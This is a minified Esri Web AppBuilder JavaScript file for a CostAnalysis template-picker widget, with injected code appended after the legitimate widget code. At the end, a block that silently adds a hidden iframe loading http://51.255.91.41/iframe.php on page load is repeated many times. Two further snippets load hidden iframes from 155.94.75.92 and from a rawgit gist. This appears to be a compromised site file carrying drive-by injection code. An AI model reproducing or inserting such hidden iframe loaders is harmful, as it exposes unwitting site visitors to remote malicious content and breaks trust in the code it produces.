// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/template-picker.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTAssetTemplatePicker" data-dojo-attach-point\x3d"templatePickerNode"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTEditorToolBar" data-dojo-attach-point\x3d"editorToolbarNode"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./template-picker.html dojo/_base/array dojo/_base/lang dojo/on dojo/Deferred dojo/dom-class dojo/dom-construct esri/dijit/editing/Editor esri/tasks/GeometryService dojo/_base/html jimu/dijit/Popup jimu/dijit/Message dojo/keys esri/geometry/geometryEngine ./scenario-selection esri/SpatialReference esri/geometry/Polyline esri/geometry/Polygon esri/tasks/query esri/tasks/QueryTask esri/graphic".split(" "),function(x,
y,z,A,B,f,d,l,q,r,C,n,D,E,F,G,t,m,u,p,v,H,I,J,w){return x([y,z,A],{templateString:B,baseClass:"jimu-widget-cost-template-picker",_projectOverview:null,_templatePicker:null,_editor:null,_scenarioSelectionObj:null,_selectScenarioPopup:null,_isFeatureIntersected:null,_configuredTemplateObj:[],_configuredGeographyCostEquation:{},_onBeforeEditCompleteResult:{},_templateInfoCalculated:!1,_addFeaturesEventInfo:[],_windowResizeTimer:null,selectedTemplateInfo:{},_splitAssetsArr:[],_currentAssetSplitGeometry:null,
_nonEditableLayers:[],_splitAssetInfo:[],_allIntersectedRegions:[],_selectedTemplate:null,_featuresToBeCopied:[],_layerEvents:[],postCreate:function(){this.inherited(arguments);this._isFeatureIntersected=this._selectScenarioPopup=this._scenarioSelectionObj=this._editor=this._templatePicker=this._projectOverview=null;this._configuredTemplateObj=[];this._configuredGeographyCostEquation={};this.selectedTemplateInfo={};this._onBeforeEditCompleteResult={};this._addFeaturesEventInfo=[];this._splitAssetsArr=
[];this._currentAssetSplitGeometry=null;this._nonEditableLayers=[];this._splitAssetInfo=[];this._windowResizeTimer=null;this._allIntersectedRegions=[];this._selectedTemplate=null;this._featuresToBeCopied=[];this._layerEvents=[]},startup:function(){this.inherited(arguments);this._getLayersForSelection();l(window,"resize",d.hitch(this,this.onWindowResize))},destroy:function(){this.removeLayerEvents();this._configuredGeographyCostEquation={};this._editor.destroy();this._editor=null;this.inherited(arguments)},
loadCostingInfo:function(a,c){var b,e;b=c.GEOGRAPHYGUID;e=c.TEMPLATENAME;this._configuredGeographyCostEquation.hasOwnProperty(b)?this._configuredGeographyCostEquation[b].hasOwnProperty(a)?this._configuredGeographyCostEquation[b][a].hasOwnProperty(e)||(this._configuredGeographyCostEquation[b][a][e]=c):(this._configuredGeographyCostEquation[b][a]={},this._configuredGeographyCostEquation[b][a][e]=c):(this._configuredGeographyCostEquation[b]={},this._configuredGeographyCostEquation[b][a]={},this._configuredGeographyCostEquation[b][a][e]=
c)},onWindowResize:function(){this._windowResizeTimer&&clearTimeout(this._windowResizeTimer);this._windowResizeTimer=setTimeout(d.hitch(this,this.resize),500)},_getLayersForSelection:function(){var a,c,b;b=[];this._getConfiguredTemplates();f.forEach(this.config.layerSettings,d.hitch(this,function(e){var d;if(e.editable||e.selectable)if(a=this.map.getLayer(e.id))c=this._getLayerSettingsById(e.id),c.selectedField&&(d=c.selectedField),(a=this._filterLayerTemplates(a,d))&&b.push({featureLayer:a,disableAttributeUpdate:!e.editable,
disableGeometryUpdate:!e.editable,editable:e.editable}),e.editable||this._nonEditableLayers.push(e.id)}));setTimeout(d.hitch(this,function(){this._initEditingToolbar(b)}),500)},_getLayerSettingsById:function(a){var c={};f.some(this.config.layerSettings,d.hitch(this,function(b){if(b.id===a)return c=b,!0}));return c},_filterLayerTemplates:function(a,c){var b,e;for(e in this.config.costingInfoSettings)0<this.config.costingInfoSettings[e].length&&(b=this.layerInfosObj.getLayerInfoById(e))&&b.layerObject&&
b.layerObject.url===a.url&&(0<a.templates.length?a.templates=this._setConfiguredTemplates(a.templates,e,c):a.types=this._setConfiguredTemplates(a.types,e,c));return a},_setConfiguredTemplates:function(a,c,b){var e,d;e=[];for(var h=a.length-1;0<=h;h--)d=a[h].templates?a[h].templates[0].name:a[h].name,d=this._configuredTemplateObj[c].indexOf(d),-1!==d&&(b&&("templates"in a[h]?a[h].templates[0].prototype.attributes[b]=this.projectInfo.projectId:a[h].prototype.attributes[b]=this.projectInfo.projectId),
e.push(a[h]));return e},_getConfiguredTemplates:function(){for(var a in this.config.costingInfoSettings)this._getConfiguredTemplateNameArray(a)},_getConfiguredTemplateNameArray:function(a){f.forEach(this.config.costingInfoSettings[a],d.hitch(this,function(c){this._configuredTemplateObj[a]||(this._configuredTemplateObj[a]=[]);this._configuredTemplateObj[a].push(c.featureTemplate)}))},_initEditingToolbar:function(a){a={settings:{map:this.map,geometryService:new D(this.config.helperServices.geometry.url),
layerInfos:a,toolbarVisible:!1,showAttributesOnClick:!0,toolbarOptions:{reshapeVisible:!1,cutVisible:!1,mergeVisible:!1},createOptions:{polylineDrawTools:[n.CREATE_TOOL_FREEHAND_POLYLINE,n.CREATE_TOOL_POLYLINE],polygonDrawTools:[n.CREATE_TOOL_POLYGON,n.CREATE_TOOL_RECTANGLE,n.CREATE_TOOL_CIRCLE,n.CREATE_TOOL_FREEHAND_POLYGON]},showTooltip:!1}};this._editor=new n(a,C.create("div",{},this.editorToolbarNode));this._editor.startup();this.bindLayerEvents();this._editor.templatePicker.showTooltip=!0;a=
f.filter(this._editor.templatePicker.featureLayers,d.hitch(this,function(a){return-1===this._nonEditableLayers.indexOf(a.id)}));this._editor.templatePicker.featureLayers=a;this._editor.templatePicker.placeAt(this.templatePickerNode);this.own(l(this._editor.templatePicker,"selection-change",d.hitch(this,function(){var a;if(a=this._editor.templatePicker.getSelected())this._selectedTemplate=a,a=this._getSelectedFeatures(a),a.isSingleGeometry&&0<a.selectedFeaturesGeometry.length&&(this._featuresToBeCopied=
a.selectedFeaturesGeometry,this._displayCopyAssetsPopup())})));this.own(l(this._editor.editToolbar,"deactivate",d.hitch(this,function(){this.emit("editEnd")})));this.own(l(this._editor.editToolbar,"activate",d.hitch(this,function(){this.emit("editStart")})));setTimeout(d.hitch(this,this.resize,100))},_getSelectedFeatures:function(a){var c=!0,b=[];f.forEach(this._editor.settings.layers,d.hitch(this,function(e){if(0<Object.keys(e.getSelectedFeatures()).length){if(a.featureLayer.geometryType!==e.geometryType)return c=
!1,!0;f.forEach(e.getSelectedFeatures(),d.hitch(this,function(a){b.push(a.geometry)}))}}));return{isSingleGeometry:c,selectedFeaturesGeometry:b}},_displayCopyAssetsPopup:function(){this._copyFeaturesDialog=new G({message:this.nls.scenarioSelection.copyFeatureMsg,type:"question",maxWidth:375,buttons:[{label:this.nls.common.yes,onClick:d.hitch(this,function(){this._copyFeaturesDialog.close();this._selectedTemplate&&this._copyFeature()})},{label:this.nls.common.no,onClick:d.hitch(this,function(){this._copyFeaturesDialog.close()})}]})},
_copyFeature:function(){var a;this._selectedTemplate&&(a=new w(this._featuresToBeCopied.shift()),this._selectedTemplate.featureLayer.applyEdits([a]))},_onCancelBtnClicked:function(){},_addCustomApplyEdits:function(){this._editor&&this._editor.settings&&this._editor.settings.layers&&f.forEach(this._editor.settings.layers,d.hitch(this,function(a){a.myApplyEdits=a.applyEdits;var c=this;a.applyEdits=function(b,e,d){b&&0!==b.length?c._selectedTemplate&&(c._orgFeature=b[0],c._checkAssetIntersection()):
a.myApplyEdits(b,e,d);var g=new q;setTimeout(function(){g.resolve(!0)},100);return g}}))},removeLayerEvents:function(){this._editor&&this._editor.settings&&this._editor.settings.layers&&f.forEach(this._editor.settings.layers,d.hitch(this,function(a){a.myApplyEdits&&(a.applyEdits=a.myApplyEdits,delete a.myApplyEdits)}));this._layerEvents&&0<this._layerEvents.length&&(f.forEach(this._layerEvents,d.hitch(this,function(a){a[0].remove()})),this._layerEvents=[])},bindLayerEvents:function(){this.removeLayerEvents();
this._addCustomApplyEdits();f.forEach(this._editor.settings.layers,d.hitch(this,function(a){var c,b;c=this.own(l(a,"before-apply-edits",d.hitch(this,this.onBeforeEditComplete)));b=this.own(l(a,"edits-complete",d.hitch(this,this.onEditCompletes)));this._layerEvents.push(c);this._layerEvents.push(b);-1<this._nonEditableLayers.indexOf(a.id)&&(c=this.own(l(a,"selection-complete",d.hitch(this,function(a){a.features.length&&this._editor&&this._editor.drawingToolbar&&this._editor.drawingToolbar._tools&&
r.add(this._editor.drawingToolbar._tools.DELETE.domNode,"esriCTHidden")}))),a=this.own(l(a,"selection-clear",d.hitch(this,function(){this._editor&&this._editor.drawingToolbar&&this._editor.drawingToolbar._tools&&r.remove(this._editor.drawingToolbar._tools.DELETE.domNode,"esriCTHidden")}))),this._layerEvents.push(c),this._layerEvents.push(a))}))},onBeforeEditComplete:function(a){this._editor.attributeInspector.focused&&(a.deletes&&0===a.deletes.length||a.updates&&0<a.updates.length)||(this.loadingIndicator.show(),
this._onBeforeEditCompleteResult[a.target.id]=a)},onEditCompletes:function(a){this._editor.attributeInspector.focused&&(a.deletes&&0===a.deletes.length||a.updates&&0<a.updates.length)||(a=this._getSucceededFeatures(a,a.target.id),this.loadingIndicator.hide(),a.deletes&&0<a.deletes.length&&this.deleteFeatures(a.deletes,a.target),a.adds&&0<a.adds.length&&this.addFeatures(a.adds,a.target),a.updates&&0<a.updates.length&&this.editFeatures(a.updates))},_getSucceededFeatures:function(a,c){f.forEach(a.adds,
d.hitch(this,function(a,e){a.success||(this._onBeforeEditCompleteResult[c].adds.splice(e,1),this._splitAssetInfo.splice(e,1))}));f.forEach(a.updates,d.hitch(this,function(a,e){a.success||(this._onBeforeEditCompleteResult[c].updates.splice(e,1),this._splitAssetInfo.splice(e,1))}));f.forEach(a.deletes,d.hitch(this,function(a,e){a.success||(this._onBeforeEditCompleteResult[c].deletes.splice(e,1),this._splitAssetInfo.splice(e,1))}));return this._onBeforeEditCompleteResult[c]},addFeatures:function(a,c){f.forEach(this._splitAssetInfo,
d.hitch(this,function(b,c){delete b.ASSETGEOMETRY;a[c].templateInfo=b;a[c].templateName=b.TEMPLATENAME}));this.emit("assetAdded",a,c,this._splitAssetInfo);this._orgFeature=null;0<this._featuresToBeCopied.length&&this._copyFeature()},editFeatures:function(a){this.emit("assetUpdated",a)},deleteFeatures:function(a,c){this.emit("assetDeleted",a,c)},_polygonToPolyline:function(a){var c,b,e,d,h;c=[];b=new v(new p(a.spatialReference));for(h=0;h<a.rings.length;h++){d=[];for(e=0;e<a.rings[h].length;e++)d.push(a.rings[h][e]);
b.addPath(d)}c.push(b);return c},_getSplitFeatureGeometries:function(a,c){var b,e,g,h;b=[];g=[];0<c.length?("polyline"===a.geometry.type?h=!0:"polygon"===a.geometry.type&&(h=!1),f.forEach(c,d.hitch(this,function(a){b.push(a.geometry)})),c=m.union(b),c=this._polygonToPolyline(c)[0],e=a.geometry,c=m.cut(e,c),1<c.length?(g.push({geometry:c[0],isIntersectedGeometry:!1}),h?f.forEach(c[1].paths,d.hitch(this,function(b){var c;c=new v(new p(a.geometry.spatialReference));c.addPath(b);g.push({geometry:c,isIntersectedGeometry:!0})})):
f.forEach(c[1].rings,d.hitch(this,function(b){var c;c=new H(new p(a.geometry.spatialReference));c.addRing(b);g.push({geometry:c,isIntersectedGeometry:!0})}))):g.push({geometry:a.geometry,isIntersectedGeometry:!0})):g.push({geometry:a.geometry,isIntersectedGeometry:!1});return g},_checkAssetIntersection:function(){this._intersectedCostingGraphicArr=[];this._allIntersectedRegions=[];this._splitAssetInfo=[];this.selectedTemplateInfo={};this._getIntersectedCostingGraphicArr(this._orgFeature).then(d.hitch(this,
function(a){var c;if(c=m.simplify(this._orgFeature.geometry))this._orgFeature.geometry=c,this._allIntersectedRegions=d.clone(a),this._intersectedCostingGraphicArr=a,this.config.projectSettings.costingGeometryLayer?"point"===this._orgFeature.geometry.type?this._splitAssetsArr.push({geometry:this._orgFeature.geometry,isIntersectedGeometry:0<a.length}):this._splitAssetsArr=this._getSplitFeatureGeometries(this._orgFeature,this._intersectedCostingGraphicArr):this._splitAssetsArr.push({geometry:this._orgFeature.geometry,
isIntersectedGeometry:0<a.length}),this._processOverlappingGeometries()}))},_getIntersectedCostingGraphicArr:function(a){var c,b,e,g;c=new q;this.config.projectSettings.costingGeometryLayer?(b=new I,g=this.map.getLayer(this.config.projectSettings.costingGeometryLayer),e=new J(g.url),g.getDefinitionExpression()&&(b.where=g.getDefinitionExpression()),b.outSpatialReference=a.geometry.spatialReference,b.returnGeometry=!0,b.outFields=["*"],b.geometry=a.geometry,e.execute(b,d.hitch(this,function(a){var b=
[];a&&0<a.features.length&&(b=a.features);c.resolve(b)}),d.hitch(this,function(){c.resolve([])}))):setTimeout(d.hitch(this,function(){c.resolve([])}),0);return c.promise},_processOverlappingGeometries:function(){var a=[],c=[],b=[],e=[];0<this._splitAssetsArr.length&&(f.forEach(this._splitAssetsArr,d.hitch(this,function(b){b.isIntersectedGeometry?(b=this._splitForOverlappingGeometries(b),0<b.processed.length&&(a=a.concat(b.processed)),0<b.unProcessed.length&&(c=c.concat(b.unProcessed))):a.push(b)})),
this._splitAssetsArr=[],this._splitAssetsArr=a);f.forEach(c,d.hitch(this,function(a){a=this._splitForOverlappingGeometries(a,!0);0<a.processed.length&&(b=b.concat(a.processed));0<a.unProcessed.length&&(e=e.concat(a.unProcessed))}));this._splitAssetsArr=this._splitAssetsArr.concat(b);this._deleteDuplicateSplits();this._displayPopupForAssets()},_deleteDuplicateSplits:function(){var a=[];f.forEach(this._splitAssetsArr,d.hitch(this,function(c,b){if(0>a.indexOf(b))for(b+=1;b<this._splitAssetsArr.length;b++)m.equals(c.geometry,
this._splitAssetsArr[b].geometry)&&a.push(b)}));0<a.length&&(a.sort(function(a,b){return a-b}),f.forEach(a,d.hitch(this,function(a,b){this._splitAssetsArr.splice(a-b,1)})))},isLineValid:function(a){return a.paths&&1===a.paths.length&&2===a.paths[0].length&&a.paths[0][0][0]===a.paths[0][1][0]&&a.paths[0][0][1]===a.paths[0][1][1]?!1:!0},_splitForOverlappingGeometries:function(a,c){var b=[],e=[],g=[],h=!1;f.forEach(this._allIntersectedRegions,d.hitch(this,function(b){m.intersects(a.geometry,b.geometry)&&
g.push(b)}));f.forEach(g,d.hitch(this,function(b){m.contains(b.geometry,a.geometry)&&(h=!0)}));if(h)b.push(a);else{var l=a.geometry,k=g.length;f.forEach(g,d.hitch(this,function(a,d){a=this._polygonToPolyline(a.geometry)[0];a=m.cut(l,a);if(1<a.length)for(l=a[0],d=1;d<a.length;d++)1===d&&this.isLineValid(a[d])?b.push({geometry:a[d],isIntersectedGeometry:!0}):e.push({geometry:a[d],isIntersectedGeometry:!0});else 0<a.length?this.isLineValid(a[0])&&b.push({geometry:a[0],isIntersectedGeometry:!0}):c?this.isLineValid(l)&&
b.push({geometry:l,isIntersectedGeometry:!0}):d===k-1&&e.push({geometry:l,isIntersectedGeometry:!0})}))}return{processed:b,unProcessed:e}},_displayPopupForAssets:function(){var a,c;this.map.getLayer(this.config.projectSettings.costingGeometryLayer);if(0<this._splitAssetsArr.length){a=this._splitAssetsArr.pop(0);this._currentAssetSplitGeometry=a.geometry;this._intersectedCostingGraphicArr=[];c=!1;a.isIntersectedGeometry&&f.forEach(this._allIntersectedRegions,d.hitch(this,function(b){m.contains(b.geometry,
a.geometry)&&(this._intersectedCostingGraphicArr.push(b),c=!0)}));if(1<this._intersectedCostingGraphicArr.length){var b;b=this._intersectedCostingGraphicArr[0];this._intersectedCostingGraphicArr=[];this._intersectedCostingGraphicArr.push(b)}c?(this._isFeatureIntersected=c,this._displayPopupForRegion()):this._initializeScenarioSelection(this.nls.scenarioSelection.noneText,c,null)}else 0<this._splitAssetInfo.length&&this._createAndAddFeatures(this._splitAssetInfo)},_createAndAddFeatures:function(a){var c,
b=[];this._selectedTemplate&&(c=d.clone(this._selectedTemplate.template.prototype.attributes),f.forEach(a,d.hitch(this,function(a){b.push(new w(a.ASSETGEOMETRY,null,d.clone(c)))})),this._editor._layer.myApplyEdits(b,null,null))},_displayPopupForRegion:function(){var a,c,b;b=this.map.getLayer(this.config.projectSettings.costingGeometryLayer);0<this._intersectedCostingGraphicArr.length?(c=this._intersectedCostingGraphicArr.pop(0),a=c.attributes[this.config.projectSettings.geographyField],c=c.attributes[b.globalIdField],
this._initializeScenarioSelection(a,this._isFeatureIntersected,c)):this._displayPopupForAssets()},_destroyScenarioSelection:function(){this._scenarioSelectionObj&&this._scenarioSelectionObj.destroy();this._selectScenarioPopup&&this._selectScenarioPopup.destroy()},_initializeScenarioSelection:function(a,c,b){var e,g,h,l,k;l=this._selectedTemplate.featureLayer.id;k=this._selectedTemplate.template.name;this._destroyScenarioSelection();e=[];g=[];f.forEach(this.config.costingInfoSettings[l],d.hitch(this,
function(b){if(b.geography===a&&b.featureTemplate===k){if(""===b.scenario||null===b.scenario||void 0===b.scenario)b=d.clone(b),b.scenario=this.nls.scenarioSelection.noneText;e.push(b)}else if(b.featureTemplate===k&&(""===b.geography||null===b.geography||void 0===b.geography)){if(""===b.scenario||null===b.scenario||void 0===b.scenario)h=b.costEquation,b=d.clone(b),b.scenario=this.nls.scenarioSelection.noneText,b.geography=this.nls.scenarioSelection.noneText;g.push(b)}}));1===e.length?(this._configuredGeographyCostEquation[b]&&
this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k]?(this.selectedTemplateInfo=this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k],this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry):(this.selectedTemplateInfo={},this.selectedTemplateInfo.TEMPLATENAME=k,this.selectedTemplateInfo.COSTEQUATION=e[0].costEquation,this.selectedTemplateInfo.GEOGRAPHY=
a,this.selectedTemplateInfo.SCENARIO=e[0].scenario,this.selectedTemplateInfo.GEOGRAPHYGUID=b,this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry,this._configuredGeographyCostEquation.hasOwnProperty(this.selectedTemplateInfo.GEOGRAPHYGUID)||(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID]={}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID].hasOwnProperty(this._selectedTemplate.featureLayer.id)||(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id]=
{}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id][this.selectedTemplateInfo.TEMPLATENAME]=this.selectedTemplateInfo),this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo)),this._displayPopupForRegion()):1!==g.length||0!==e.length||c?1<g.length&&0===e.length&&!c?this._configuredGeographyCostEquation[b]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k]?
(this.selectedTemplateInfo=this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k],this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry,this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo)),this._displayPopupForRegion()):(this._scenarioSelectionObj=new u({regionName:a,scenarioOptions:g,nls:this.nls,templateName:k,geographyGlobalID:b,costingGeometryLayer:this.config.projectSettings.costingGeometryLayer}),this._displaySelectScenarioPopup(a)):0===
e.length?(this._configuredGeographyCostEquation[b]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k]?(this.selectedTemplateInfo=this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k],this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry):(this.selectedTemplateInfo={},this.selectedTemplateInfo.TEMPLATENAME=k,this.selectedTemplateInfo.COSTEQUATION=
h,this.selectedTemplateInfo.GEOGRAPHY=a,this.selectedTemplateInfo.SCENARIO=this.nls.scenarioSelection.noneText,this.selectedTemplateInfo.GEOGRAPHYGUID=b,this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry,this._configuredGeographyCostEquation.hasOwnProperty(this.selectedTemplateInfo.GEOGRAPHYGUID)||(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID]={}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID].hasOwnProperty(this._selectedTemplate.featureLayer.id)||
(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id]={}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id][this.selectedTemplateInfo.TEMPLATENAME]=this.selectedTemplateInfo),this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo)),this._displayPopupForRegion()):1<e.length&&(this._configuredGeographyCostEquation[b]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id]&&
this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k]?(this.selectedTemplateInfo=this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k],this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry,this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo)),this._displayPopupForRegion()):(this._scenarioSelectionObj=new u({regionName:a,scenarioOptions:e,nls:this.nls,templateName:k,geographyGlobalID:b,costingGeometryLayer:this.config.projectSettings.costingGeometryLayer}),
this._displaySelectScenarioPopup(a))):(this._configuredGeographyCostEquation[b]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id]&&this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k]?(this.selectedTemplateInfo=this._configuredGeographyCostEquation[b][this._selectedTemplate.featureLayer.id][k],this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry):(this.selectedTemplateInfo={},this.selectedTemplateInfo.TEMPLATENAME=k,
this.selectedTemplateInfo.COSTEQUATION=g[0].costEquation,this.selectedTemplateInfo.GEOGRAPHY=a,this.selectedTemplateInfo.SCENARIO=this.nls.scenarioSelection.noneText,this.selectedTemplateInfo.GEOGRAPHYGUID=b,this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry,this._configuredGeographyCostEquation.hasOwnProperty(this.selectedTemplateInfo.GEOGRAPHYGUID)||(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID]={}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID].hasOwnProperty(this._selectedTemplate.featureLayer.id)||
(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id]={}),this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id][this.selectedTemplateInfo.TEMPLATENAME]=this.selectedTemplateInfo),this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo)),this._displayPopupForRegion())},_displaySelectScenarioPopup:function(){this._selectScenarioPopup=new F({titleLabel:this.nls.scenarioSelection.popupTitle,
autoHeight:!0,content:this._scenarioSelectionObj,width:400,buttons:[{label:this.nls.common.ok,key:t.ENTER,onClick:d.hitch(this,"_onScenarioSelectionOk")},{label:this.nls.common.cancel,key:t.ESCAPE,onClick:d.hitch(this,"_onScenarioSelectionCancel")}]});this._scenarioSelectionObj.startup()},_onScenarioSelectionOk:function(){var a;this.selectedTemplateInfo={};a=this._scenarioSelectionObj.scenarioDropDown._getSelectedOptionsAttr();this.selectedTemplateInfo.TEMPLATENAME=a.item.featureTemplate;this.selectedTemplateInfo.COSTEQUATION=
a.item.costEquation;this.selectedTemplateInfo.GEOGRAPHY=this._scenarioSelectionObj.regionNameTextBox.getValue();this.selectedTemplateInfo.SCENARIO=a.label;this.selectedTemplateInfo.GEOGRAPHYGUID=a.item.geographyGlobalID;this.selectedTemplateInfo.ASSETGEOMETRY=this._currentAssetSplitGeometry;this._configuredGeographyCostEquation.hasOwnProperty(this.selectedTemplateInfo.GEOGRAPHYGUID)||(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID]={});this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID].hasOwnProperty(this._selectedTemplate.featureLayer.id)||
(this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id]={});this._configuredGeographyCostEquation[this.selectedTemplateInfo.GEOGRAPHYGUID][this._selectedTemplate.featureLayer.id][this.selectedTemplateInfo.TEMPLATENAME]=this.selectedTemplateInfo;this._selectScenarioPopup.close();this._splitAssetInfo.push(d.clone(this.selectedTemplateInfo));this._displayPopupForRegion()},_onScenarioSelectionCancel:function(){this._selectScenarioPopup.close()},
resize:function(){0<E.getMarginBox(this.domNode).w&&this._editor&&this._editor.templatePicker&&this._editor.templatePicker.update(!0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});